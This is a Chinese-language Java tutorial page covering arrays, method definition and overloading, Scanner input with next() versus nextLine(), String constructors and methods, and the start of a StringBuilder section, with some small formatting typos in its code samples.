<h1 id="Java-数组"><a href="#Java-数组" class="headerlink" title="Java 数组"></a>Java 数组</h1><p>数组对于每一门编程语言来说都是重要的数据结构之一，当然不同语言对数组的实现及处理也不尽相同。</p>
<p>Java 语言中提供的数组是用来存储固定大小的同类型元素。</p>
<p>你可以声明一个数组变量，如 numbers[100] 来代替直接声明 100 个独立变量 number0，number1，….，number99。</p>
<h2 id="声明数组变量"><a href="#声明数组变量" class="headerlink" title="声明数组变量"></a>声明数组变量</h2><p>首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法：</p>
<p>dataType[] arrayRefVar;   &#x2F;&#x2F; 首选的方法  或  dataType arrayRefVar[];  &#x2F;&#x2F; 效果相同，但不是首选方法</p>
<p><strong>注意:</strong> 建议使用 <strong>dataType[] arrayRefVar</strong> 的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C&#x2F;C++ 语言 ，在Java中采用是为了让 C&#x2F;C++ 程序员能够快速理解java语言。</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>下面是这两种语法的代码示例：</p>
<p>double[] myList;         &#x2F;&#x2F; 首选的方法  </p>
<p>double myList[];         &#x2F;&#x2F;  效果相同，但不是首选方法</p>
<hr>
<h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>Java语言使用new操作符来创建数组，语法如下：</p>
<p>arrayRefVar &#x3D; new dataType[arraySize];</p>
<p>上面的语法语句做了两件事：</p>
<ul>
<li>一、使用 dataType[arraySize] 创建了一个数组。</li>
<li>二、把新创建的数组的引用赋值给变量 arrayRefVar。</li>
</ul>
<p>数组变量的声明，和创建数组可以用一条语句完成，如下所示：</p>
<p>dataType[] arrayRefVar &#x3D; new dataType[arraySize];</p>
<p>另外，你还可以使用如下的方式创建数组。</p>
<p>dataType[] arrayRefVar &#x3D; {value0, value1, …, valuek};</p>
<p>数组的元素是通过索引访问的。数组索引从 0 开始，所以索引值从 0 到 arrayRefVar.length-1。</p>
<hr>
<h2 id="数组作为函数的参数"><a href="#数组作为函数的参数" class="headerlink" title="数组作为函数的参数"></a>数组作为函数的参数</h2><p>数组可以作为参数传递给方法。</p>
<p>例如，下面的例子就是一个打印 int 数组中元素的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void printArray(int[] array) &#123;</span><br><span class="line">     for (int i = 0; i &lt; array.length; i++) &#123;</span><br><span class="line">    		 System.out.print(array[i] + &quot; &quot;);  &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>下面例子调用 printArray 方法打印出 3，1，2，6，4 和 2：</p>
<p>printArray(new int[]{3, 1, 2, 6, 4, 2});</p>
<hr>
<h2 id="数组作为函数的返回值"><a href="#数组作为函数的返回值" class="headerlink" title="数组作为函数的返回值"></a>数组作为函数的返回值</h2><p>public static int[] reverse(int[] list) {  </p>
<p>​		int[] result &#x3D; new int[list.length];  </p>
<p>​	   for (int i &#x3D; 0, j &#x3D; result.length - 1; i &lt; list.length; i++, j–) { </p>
<p>​			  result[j] &#x3D; list[i];  } </p>
<p>​	   return result; }</p>
<p>以上实例中 result 数组作为函数的返回值。</p>
<hr>
<h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组，例如：</p>
<p>String[][] str &#x3D; new String[3][4];</p>
<h3 id="多维数组的动态初始化（以二维数组为例）"><a href="#多维数组的动态初始化（以二维数组为例）" class="headerlink" title="多维数组的动态初始化（以二维数组为例）"></a>多维数组的动态初始化（以二维数组为例）</h3><p><strong>1.直接为每一维分配空间，格式如下：</strong></p>
<p>type[][] typeName &#x3D; new type[typeLength1] [typeLength2];</p>
<p>type 可以为基本数据类型和复合数据类型，typeLength1 和 typeLength2 必须为正整数，typeLength1 为行数，typeLength2 为列数。</p>
<p>例如：</p>
<p>int[][] a &#x3D; new int[2] [3];</p>
<p>解析：</p>
<p>二维数组 a 可以看成一个两行三列的数组。</p>
<p><strong>2.从最高维开始，分别为每一维分配空间，例如：</strong></p>
<p>String[][] s &#x3D; new String[2] []; </p>
<p>s[0] &#x3D; new String[2];</p>
<p>s[1] &#x3D; new String[3];</p>
<p>s[0] [0] &#x3D; new String(“Good”);</p>
<p>s[0] [1] &#x3D; new String(“Luck”); </p>
<p>s[1] [0] &#x3D; new String(“to”); </p>
<p>s[1] [1] &#x3D; new String(“you”); </p>
<p>s[1] [2] &#x3D; new String(“!”);</p>
<p>解析：</p>
<p><strong>s[0]&#x3D;new String[2]</strong> 和 <strong>s[1]&#x3D;new String[3]</strong> 是为最高维分配引用空间，也就是为最高维限制其能保存数据的最长的长度，然后再为其每个数组元素单独分配空间 <strong>s0&#x3D;new String(“Good”)</strong> 等操作。</p>
<h3 id="多维数组的引用（以二维数组为例）"><a href="#多维数组的引用（以二维数组为例）" class="headerlink" title="多维数组的引用（以二维数组为例）"></a>多维数组的引用（以二维数组为例）</h3><p>对二维数组中的每个元素，引用方式为 **arrayName[index1] [index2]**，例如：</p>
<p>num[1] [0];</p>
<hr>
<h4 id="数组操作的两个常见小问题"><a href="#数组操作的两个常见小问题" class="headerlink" title="数组操作的两个常见小问题"></a>数组操作的两个常见小问题</h4><p><strong>索引越界</strong>:访问了数组中不存在的索引对应的元素，造成索引樾越界问题<br><strong>空指针异常</strong>:访问的数组已经不再指向堆内存的数据，造成空指针异常<br><strong>null</strong>:空值，引用数据类型的默认值，表示不指向任何有效对象</p>
<h2 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h2><p>java.util.Arrays 类能方便地操作数组，它提供的所有方法都是静态的。</p>
<p>具有以下功能：</p>
<ul>
<li>给数组赋值：通过 fill 方法。</li>
<li>对数组排序：通过 sort 方法,按升序。</li>
<li>比较数组：通过 equals 方法比较数组中元素值是否相等。</li>
<li>查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</li>
</ul>
<p>具体说明请查看下表：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法和说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>public static int binarySearch(Object[] a, Object key)</strong> 用二分查找算法在给定数组中搜索给定值的对象(Byte,Int,double等)。数组在调用前必须排序好的。如果查找值包含在数组中，则返回搜索键的索引；否则返回 (-(<em>插入点</em>) - 1)。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>public static boolean equals(long[] a, long[] a2)</strong> 如果两个指定的 long 型数组彼此<em>相等</em>，则返回 true。如果两个数组包含相同数量的元素，并且两个数组中的所有相应元素对都是相等的，则认为这两个数组是相等的。换句话说，如果两个数组以相同顺序包含相同的元素，则两个数组是相等的。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>public static void fill(int[] a, int val)</strong> 将指定的 int 值分配给指定 int 型数组指定范围中的每个元素。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>public static void sort(Object[] a)</strong> 对指定对象数组根据其元素的自然顺序进行升序排列。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td>
</tr>
</tbody></table>
<h1 id="Java-方法"><a href="#Java-方法" class="headerlink" title="Java 方法"></a>Java 方法</h1><p>在前面几个章节中我们经常使用到 **System.out.println()**，那么它是什么呢？</p>
<ul>
<li>println() 是一个方法。</li>
<li>System 是系统类。</li>
<li>out 是标准输出对象。</li>
</ul>
<p>这句话的用法是调用系统类 System 中的标准输出对象 out 中的方法 println()。</p>
<h2 id="那么什么是方法呢？"><a href="#那么什么是方法呢？" class="headerlink" title="那么什么是方法呢？"></a>那么什么是方法呢？</h2><p>Java方法是语句的集合，它们在一起执行一个功能。</p>
<ul>
<li>方法是解决一类问题的步骤的有序组合</li>
<li>方法包含于类或对象中</li>
<li>方法在程序中被创建，在其他地方被引用</li>
</ul>
<h2 id="方法的优点"><a href="#方法的优点" class="headerlink" title="方法的优点"></a>方法的优点</h2><ul>
<li><ol>
<li>使程序变得更简短而清晰。</li>
</ol>
</li>
<li><ol start="2">
<li>有利于程序维护。</li>
</ol>
</li>
<li><ol start="3">
<li>可以提高程序开发的效率。</li>
</ol>
</li>
<li><ol start="4">
<li>提高了代码的重用性。</li>
</ol>
</li>
</ul>
<h2 id="方法的命名规则"><a href="#方法的命名规则" class="headerlink" title="方法的命名规则"></a>方法的命名规则</h2><ul>
<li>1.方法的名字的第一个单词应以小写字母作为开头，后面的单词则用大写字母开头写，不使用连接符。例如：<strong>addPerson</strong>。</li>
<li>2.下划线可能出现在 JUnit 测试方法名称中用以分隔名称的逻辑组件。一个典型的模式是：**test<MethodUnderTest>_<state>**，例如 <strong>testPop_emptyStack</strong>。</li>
</ul>
<hr>
<h2 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h2><p>一般情况下，定义一个方法包含以下语法：</p>
<p>修饰符 返回值类型 方法名(参数类型 参数名){    …    方法体    …    return 返回值; }</p>
<p>方法包含一个方法头和一个方法体。下面是一个方法的所有部分：</p>
<ul>
<li><strong>修饰符：</strong>修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。</li>
<li><strong>返回值类型 ：</strong>方法可能会返回值。returnValueType 是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType 是关键字<strong>void</strong>。</li>
<li><strong>方法名：</strong>是方法的实际名称。方法名和参数表共同构成方法签名。</li>
<li><strong>参数类型：</strong>参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。</li>
<li><strong>方法体：</strong>方法体包含具体的语句，定义该方法的功能。</li>
</ul>
<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/D53C92B3-9643-4871-8A72-33D491299653.jpg" alt="img"></p>
<p>如：</p>
<p>public static int age(int birthday){…}</p>
<p>参数可以有多个：</p>
<p>static float interest(float principal, int year){…}</p>
<p><strong>注意：</strong> 在一些其它语言中方法指过程和函数。一个返回非void类型返回值的方法称为函数；一个返回void类型返回值的方法叫做过程。</p>
<hr>
<h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><p>Java 支持两种调用方法的方式，根据方法是否返回值来选择。</p>
<p>当程序调用一个方法时，程序的控制权交给了被调用的方法。当被调用方法的返回语句执行或者到达方法体闭括号时候交还控制权给程序。</p>
<p>当方法返回一个值的时候，方法调用通常被当做一个值。例如：</p>
<p>int larger &#x3D; max(30, 40);</p>
<p>如果方法返回值是void，方法调用一定是一条语句。例如，方法println返回void。下面的调用是个语句：</p>
<p>System.out.println(“欢迎访问菜鸟教程！”);</p>
<p>main 方法是被 JVM 调用的，除此之外，main 方法和其它方法没什么区别。</p>
<p>main 方法的头部是不变的，如例子所示，带修饰符 public 和 static,返回 void 类型值，方法名字是 main,此外带个一个 String[] 类型参数。String[] 表明参数是字符串数组。</p>
<hr>
<h2 id="void-关键字"><a href="#void-关键字" class="headerlink" title="void 关键字"></a>void 关键字</h2><p>一个void类型方法，它不返回值。</p>
<p>一个void方法的调用一定是一个语句。 就像任何以分号结束的语句一样</p>
<h2 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h2><p>上面使用的max方法仅仅适用于int型数据。但如果你想得到两个浮点类型数据的最大值呢？</p>
<p>解决方法是创建另一个有相同名字但参数不同的方法，如下面代码所示：</p>
<p>public static double max(double num1, double num2) {  </p>
<p>​		if (num1 &gt; num2)    </p>
<p>​				return num1; </p>
<p>​		 else<br>​				return num2;  }</p>
<p>如果你调用max方法时传递的是int型参数，则 int型参数的max方法就会被调用；</p>
<p>如果传递的是double型参数，则double类型的max方法体会被调用，这叫做方法重载；</p>
<p>就是说一个类的两个方法拥有相同的名字，但是有不同的参数列表。</p>
<p>Java编译器根据方法签名判断哪个方法应该被调用。</p>
<p>方法重载可以让程序更清晰易读。执行密切相关任务的方法应该使用相同的名字。</p>
<p>重载的方法必须拥有不同的参数列表。你不能仅仅依据修饰符或者返回类型的不同来重载方法。</p>
<hr>
<h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><p>变量的范围是程序中该变量可以被引用的部分。</p>
<p>方法内定义的变量被称为局部变量。</p>
<p>局部变量的作用范围从声明开始，直到包含它的块结束。</p>
<p>局部变量必须声明才可以使用。</p>
<p>方法的参数范围涵盖整个方法。参数实际上是一个局部变量。</p>
<p>for循环的初始化部分声明的变量，其作用范围在整个循环。</p>
<p>但循环体内声明的变量其适用范围是从它声明到循环体结束。</p>
<p>你可以在一个方法里，不同的非嵌套块中多次声明一个具有相同的名称局部变量，但你不能在嵌套块内两次声明局部变量。</p>
<h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><h2 id="Scanner使用的基本步骤"><a href="#Scanner使用的基本步骤" class="headerlink" title="Scanner使用的基本步骤"></a>Scanner使用的基本步骤</h2><p><strong>1.导包</strong><br><code>import java.util.Scanner;</code></p>
<p> 导包的动作必须出现在类定义的上边<br><strong>2.创建对象</strong><br><code>Scanner sc=new Scanner(System.in);</code><br>上面这个格式里面，只有sc是变量名，可以变，其他的都不允许变。<br><strong>3.接收数据</strong><br><code>int i=sc.nextInt();</code><br>上面这个格式里面，只有是变量名，可以变，其他的都不允许变。</p>
<h2 id="Java-Scanner-类"><a href="#Java-Scanner-类" class="headerlink" title="Java Scanner 类"></a>Java Scanner 类</h2><p>下面是创建 Scanner 对象的基本语法：</p>
<p>Scanner s &#x3D; new Scanner(System.in);</p>
<p>接下来我们演示一个最简单的数据输入，并通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据：</p>
<h3 id="使用-next-方法："><a href="#使用-next-方法：" class="headerlink" title="使用 next 方法："></a>使用 next 方法：</h3><p><strong>ScannerDemo.java 文件代码：</strong></p>
<p>import java.util.Scanner;   </p>
<p>public class ScannerDemo {  </p>
<p>​		  public static void main(String[] args) {        </p>
<p>​					Scanner scan &#x3D; new Scanner(System.in);        &#x2F;&#x2F; 从键盘接收数据         &#x2F;&#x2F; next方式接收字符串        </p>
<p>​					System.out.println(“next方式接收：”);        &#x2F;&#x2F; 判断是否还有输入      </p>
<p>​				    if (scan.hasNext()) {            </p>
<p>​						String str1 &#x3D; scan.next();            </p>
<p>​						System.out.println(“输入的数据为：” + str1);      </p>
<p>​					}        </p>
<p>​				    scan.close();   </p>
<p>​		 } </p>
<p>}</p>
<p>执行以上程序输出结果为：</p>
<p>$ javac ScannerDemo.java<br>$ java ScannerDemo<br>next方式接收：<br>runoob com<br>输入的数据为：runoob</p>
<p>可以看到 com 字符串并未输出，接下来我们看 nextLine。</p>
<h3 id="使用-nextLine-方法："><a href="#使用-nextLine-方法：" class="headerlink" title="使用 nextLine 方法："></a>使用 nextLine 方法：</h3><p><strong>ScannerDemo.java 文件代码：</strong></p>
<p>import java.util.Scanner;</p>
<p>public class ScannerDemo {<br>        public static void main(String[] args) {<br>                Scanner scan &#x3D; new Scanner(System.in);<br>                &#x2F;&#x2F; 从键盘接收数据</p>
<p>​				 &#x2F;&#x2F; nextLine方式接收字符串</p>
<p>​				System.out.println(“nextLine方式接收：”);<br>​				&#x2F;&#x2F; 判断是否还有输入<br>​				if (scan.hasNextLine()) {<br>                        String str2 &#x3D; scan.nextLine();<br>                        System.out.println(“输入的数据为：” + str2);<br>​				}<br>​				scan.close();</p>
<p>​	   }</p>
<p>}</p>
<p>执行以上程序输出结果为：</p>
<p>$ javac ScannerDemo.java<br>$ java ScannerDemo<br>nextLine方式接收：<br>runoob com<br>输入的数据为：runoob com</p>
<p>可以看到 com 字符串输出。</p>
<h3 id="next-与-nextLine-区别"><a href="#next-与-nextLine-区别" class="headerlink" title="next() 与 nextLine() 区别"></a>next() 与 nextLine() 区别</h3><p>next():</p>
<ul>
<li>1、一定要读取到有效字符后才可以结束输入。</li>
<li>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。</li>
<li>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。</li>
<li>next() 不能得到带有空格的字符串。</li>
</ul>
<p>nextLine()：</p>
<ul>
<li>1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。</li>
<li>2、可以获得空白。</li>
</ul>
<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="String概述"><a href="#String概述" class="headerlink" title="String概述"></a>String概述</h2><p>String类在<code>java.lang</code> 包下，所以使用的时候不需要导包<br><code>String</code> 类代表<code>字符串</code>，Java程序中的所有字符串文字(例如“abc”)都被实现为此类的实例也就是说，<code>Java 程序中所有的双引号字符串，都是 String 类的对象</code><br><strong>字符串的特点</strong></p>
<ul>
<li>字符串不可变，它们的值在创建后不能被更改</li>
<li>虽然String的值是不可变的，但是它们可以被共享</li>
<li>字符串效果上相当于字符数组(char[])，但是底层原理是字节数组( byte[]])<br>JDK8及以前是字符数组，JDK9及以后是字节数组</li>
</ul>
<h2 id="String-构造方法"><a href="#String-构造方法" class="headerlink" title="String 构造方法"></a>String 构造方法</h2><table>
<thead>
<tr>
<th align="center">方法名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">public String()</td>
<td align="center">创建一个空白字符串对象，不含有任何内容</td>
</tr>
<tr>
<td align="center">public String(char[] chs)</td>
<td align="center">根据字符数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td align="center">public String(byte[] bys)</td>
<td align="center">根据字节数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td align="center">String s &#x3D; “abc” ;</td>
<td align="center">直接赋值的方式创建字符串对象，内容就是abc</td>
</tr>
</tbody></table>
<p><code>推荐直接使用字符串赋值的方式得到字符串对象</code></p>
<h2 id="String对象的特点"><a href="#String对象的特点" class="headerlink" title="String对象的特点"></a>String对象的特点</h2><p>1)通过new 创建的字符串对象，每一次new都会申请一个内存空间，虽然内容相同，但是地址值不同<br>char[] chs &#x3D;{a’，”b，c’};<br>String s1 &#x3D; new String(chs);<br>String s2 &#x3D; new String(chs);<br>上面的代码中，JVM会首先创建一个字符数组，然后每一次new的时候都会有一个新的地址，只不过s1和s2参考的字符串内容是相同的</p>
<ol start="2">
<li>以“”方式给出的字符串，只要字符序列相同(顺序和大小写)，无论在程序代码中出现几次JVM都只会建立一个String对象，并在字符串池中维护<br>String s3 &#x3D; “abc”;<br>String s4 &#x3D; “abc”;<br>在上面的代码中，针对第一行代码，JVM 会建立一个String对象放在字符串池中，并给s3参考；第二行则让s4直接参考字符串池中的String对象，也就是说它们本质上是同一个对象</li>
</ol>
<h2 id="String方法"><a href="#String方法" class="headerlink" title="String方法"></a>String方法</h2><table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">方法描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-charat.html">char charAt(int index)</a> 返回指定索引处的 char 值。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-compareto.html">int compareTo(Object o)</a> 把这个字符串和另一个对象比较。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-compareto.html">int compareTo(String anotherString)</a> 按字典顺序比较两个字符串。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-comparetoignorecase.html">int compareToIgnoreCase(String str)</a> 按字典顺序比较两个字符串，不考虑大小写。</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-concat.html">String concat(String str)</a> 将指定字符串连接到此字符串的结尾。</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-contentequals.html">boolean contentEquals(StringBuffer sb)</a> 当且仅当字符串与指定的StringBuffer有相同顺序的字符时候返回真。</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-copyvalueof.html">static String copyValueOf(char[] data)</a> 返回指定数组中表示该字符序列的 String。</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-copyvalueof.html">static String copyValueOf(char[] data, int offset, int count)</a> 返回指定数组中表示该字符序列的 String。</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-endswith.html">boolean endsWith(String suffix)</a> 测试此字符串是否以指定的后缀结束。</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-equals.html">boolean equals(Object anObject)</a> 将此字符串与指定的对象比较。</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-equalsignorecase.html">boolean equalsIgnoreCase(String anotherString)</a> 将此 String 与另一个 String 比较，不考虑大小写。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-getbytes.html">byte[] getBytes()</a>  使用平台的默认字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-getbytes.html">byte[] getBytes(String charsetName)</a> 使用指定的字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-getchars.html">void getChars(int srcBegin, int srcEnd, char[] dst, int dstBegin)</a> 将字符从此字符串复制到目标字符数组。</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-hashcode.html">int hashCode()</a> 返回此字符串的哈希码。</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(int ch)</a> 返回指定字符在此字符串中第一次出现处的索引。</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(int ch, int fromIndex)</a> 返回在此字符串中第一次出现指定字符处的索引，从指定的索引开始搜索。</td>
</tr>
<tr>
<td align="center">18</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(String str)</a>  返回指定子字符串在此字符串中第一次出现处的索引。</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(String str, int fromIndex)</a> 返回指定子字符串在此字符串中第一次出现处的索引，从指定的索引开始。</td>
</tr>
<tr>
<td align="center">20</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-intern.html">String intern()</a>  返回字符串对象的规范化表示形式。</td>
</tr>
<tr>
<td align="center">21</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(int ch)</a>  返回指定字符在此字符串中最后一次出现处的索引。</td>
</tr>
<tr>
<td align="center">22</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(int ch, int fromIndex)</a> 返回指定字符在此字符串中最后一次出现处的索引，从指定的索引处开始进行反向搜索。</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(String str)</a> 返回指定子字符串在此字符串中最右边出现处的索引。</td>
</tr>
<tr>
<td align="center">24</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(String str, int fromIndex)</a>  返回指定子字符串在此字符串中最后一次出现处的索引，从指定的索引开始反向搜索。</td>
</tr>
<tr>
<td align="center">25</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-length.html">int length()</a> 返回此字符串的长度。</td>
</tr>
<tr>
<td align="center">26</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-matches.html">boolean matches(String regex)</a> 告知此字符串是否匹配给定的正则表达式。</td>
</tr>
<tr>
<td align="center">27</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-regionmatches.html">boolean regionMatches(boolean ignoreCase, int toffset, String other, int ooffset, int len)</a> 测试两个字符串区域是否相等。</td>
</tr>
<tr>
<td align="center">28</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-regionmatches.html">boolean regionMatches(int toffset, String other, int ooffset, int len)</a> 测试两个字符串区域是否相等。</td>
</tr>
<tr>
<td align="center">29</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-replace.html">String replace(char oldChar, char newChar)</a> 返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。</td>
</tr>
<tr>
<td align="center">30</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-replaceall.html">String replaceAll(String regex, String replacement)</a> 使用给定的 replacement 替换此字符串所有匹配给定的正则表达式的子字符串。</td>
</tr>
<tr>
<td align="center">31</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-replacefirst.html">String replaceFirst(String regex, String replacement)</a>  使用给定的 replacement 替换此字符串匹配给定的正则表达式的第一个子字符串。</td>
</tr>
<tr>
<td align="center">32</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-split.html">String[] split(String regex)</a> 根据给定正则表达式的匹配拆分此字符串。</td>
</tr>
<tr>
<td align="center">33</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-split.html">String[] split(String regex, int limit)</a> 根据匹配给定的正则表达式来拆分此字符串。</td>
</tr>
<tr>
<td align="center">34</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-startswith.html">boolean startsWith(String prefix)</a> 测试此字符串是否以指定的前缀开始。</td>
</tr>
<tr>
<td align="center">35</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-startswith.html">boolean startsWith(String prefix, int toffset)</a> 测试此字符串从指定索引开始的子字符串是否以指定前缀开始。</td>
</tr>
<tr>
<td align="center">36</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-subsequence.html">CharSequence subSequence(int beginIndex, int endIndex)</a>  返回一个新的字符序列，它是此序列的一个子序列。</td>
</tr>
<tr>
<td align="center">37</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-substring.html">String substring(int beginIndex)</a> 返回一个新的字符串，它是此字符串的一个子字符串。</td>
</tr>
<tr>
<td align="center">38</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-substring.html">String substring(int beginIndex, int endIndex)</a> 返回一个新字符串，它是此字符串的一个子字符串。</td>
</tr>
<tr>
<td align="center">39</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-tochararray.html">char[] toCharArray()</a> 将此字符串转换为一个新的字符数组。</td>
</tr>
<tr>
<td align="center">40</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-tolowercase.html">String toLowerCase()</a> 使用默认语言环境的规则将此 String 中的所有字符都转换为小写。</td>
</tr>
<tr>
<td align="center">41</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-tolowercase.html">String toLowerCase(Locale locale)</a>  使用给定 Locale 的规则将此 String 中的所有字符都转换为小写。</td>
</tr>
<tr>
<td align="center">42</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-tostring.html">String toString()</a>  返回此对象本身（它已经是一个字符串！）。</td>
</tr>
<tr>
<td align="center">43</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-touppercase.html">String toUpperCase()</a> 使用默认语言环境的规则将此 String 中的所有字符都转换为大写。</td>
</tr>
<tr>
<td align="center">44</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-touppercase.html">String toUpperCase(Locale locale)</a> 使用给定 Locale 的规则将此 String 中的所有字符都转换为大写。</td>
</tr>
<tr>
<td align="center">45</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-trim.html">String trim()</a> 返回字符串的副本，忽略前导空白和尾部空白。</td>
</tr>
<tr>
<td align="center">46</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-valueof.html">static String valueOf(primitive data type x)</a> 返回给定data type类型x参数的字符串表示形式。</td>
</tr>
<tr>
<td align="center">47</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-contains.html">contains(CharSequence chars)</a> 判断是否包含指定的字符系列。</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center"><a href="https://www.runoob.com/java/java-string-isempty.html">isEmpty()</a> 判断字符串是否为空。</td>
</tr>
</tbody></table>
<p><strong>字符串的比较</strong></p>
<p>使用 &#x3D; &#x3D; 做比较</p>
<ul>
<li>基本类型:比较的是数据值是否相同</li>
<li>引用类型:比较的是地址值是否相同</li>
</ul>
<p>字符串是对象，它比较内容是否相同，是通过一个方法来实现的，这个方法叫: equals()</p>
<ul>
<li>publicboolean equals(bject anobject): 将此字符串与指定对象进行比较。由于我们比较的是字符串对象，所以参数直接传递一个字符串</li>
</ul>
<h2 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h2><h3 id="StringBuilder概述"><a href="#StringBuilder概述" class="headerlink" title="StringBuilder概述"></a>StringBuilder概述</h3><p>StringBuilder是一个可变的字符串类，我们可以把它看成是一个容器这里的可变指的是StringBuilder对象中的内容是可变的<br><strong>String 和 StringBuilder 的区别:</strong><br>String:内容是不可变的<br>StringBuilder:内容是可变的</p>
<h3 id="StringBuilder构造方法"><a href="#StringBuilder构造方法" class="headerlink" title="StringBuilder构造方法"></a>StringBuilder构造方法</h3><table>
<thead>
<tr>
<th align="center">构造器</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>StringBuilder()</code>（常用）</td>
